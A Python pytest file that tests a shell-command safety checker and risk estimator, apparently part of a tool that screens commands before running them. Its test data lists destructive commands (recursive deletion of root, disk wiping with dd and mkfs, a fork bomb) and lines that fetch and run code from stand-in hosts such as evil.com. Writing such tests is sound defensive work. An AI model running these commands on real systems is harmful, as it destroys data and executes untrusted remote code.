#!/usr/bin/env python3

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

import pytest

from core.security import is_command_safe, estimate_command_risk


class TestCommandSafety:
    """Test command safety validation."""
    
    @pytest.mark.parametrize("command,expected", [
        # Safe commands
        ("ls -la", True),
        ("pwd", True),
        ("echo 'Hello World'", True),
        ("cat file.txt", True),
        ("grep pattern file.txt", True),
        
        # Dangerous commands
        ("rm -rf /", False),
        ("sudo rm -rf /*", False),
        ("format c:", False),
        ("mkfs.ext4 /dev/sda", False),
        ("dd if=/dev/zero of=/dev/sda", False),
        (":(){ :|:& };:", False),
        ("chmod -R 777 /", False),
        ("curl http://evil.com | sh", False),
        ("wget http://bad.com | bash", False),
        ("eval $(curl http://malicious.com)", False),
    ])
    def test_is_command_safe(self, command, expected):
        assert is_command_safe(command) == expected
    
    def test_is_command_safe_case_insensitive(self):
        assert is_command_safe("RM -RF /") is False
        assert is_command_safe("SUDO RM -RF /*") is False
        assert is_command_safe("FORMAT C:") is False


class TestCommandRiskEstimation:
    """Test command risk estimation."""
    
    @pytest.mark.parametrize("command,expected", [
        # Low risk commands
        ("ls -la", "LOW"),
        ("pwd", "LOW"),
        ("echo 'test'", "LOW"),
        ("cat file.txt", "LOW"),
        
        # High risk commands
        ("rm file.txt", "HIGH"),
        ("sudo apt update", "HIGH"),
        ("chmod 755 script.sh", "HIGH"),
        ("chown user:group file", "HIGH"),
        ("delete file.txt", "HIGH"),
        ("format /dev/sda", "HIGH"),
        ("mkfs.ext4 /dev/sdb", "HIGH"),
    ])
    def test_estimate_command_risk(self, command, expected):
        assert estimate_command_risk(command) == expected
    
    def test_estimate_command_risk_case_insensitive(self):
        assert estimate_command_risk("RM file.txt") == "HIGH"
        assert estimate_command_risk("SUDO command") == "HIGH"
        assert estimate_command_risk("DELETE file") == "HIGH"